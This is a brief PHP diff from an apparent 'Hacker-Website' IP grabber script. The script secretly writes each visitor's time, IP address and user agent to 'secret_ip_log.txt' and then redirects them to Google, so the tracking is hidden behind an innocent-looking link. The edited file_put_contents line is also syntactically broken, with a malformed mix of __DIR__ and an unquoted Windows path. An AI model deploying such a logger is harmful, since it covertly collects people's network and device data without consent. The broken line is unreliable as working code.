@@ -5,7 +5,7 @@ $user_agent = $_SERVER['HTTP_USER_AGENT'];
 
 $log_entry = "Time: " . $timestamp . " | IP: " . $visitor_ip . " | Device: " . $user_agent . "\n";
 
-file_put_contents('secret_ip_log.txt', $log_entry, FILE_APPEND);
+file_put_contents($logFile = __DIR__ C:\Users\liamb\OneDrive\Desktop\Hacker-Website\secret_ip_log.txt'; , $log_entry, FILE_APPEND);
 
 header('Location: https://www.google.com');
 exit();
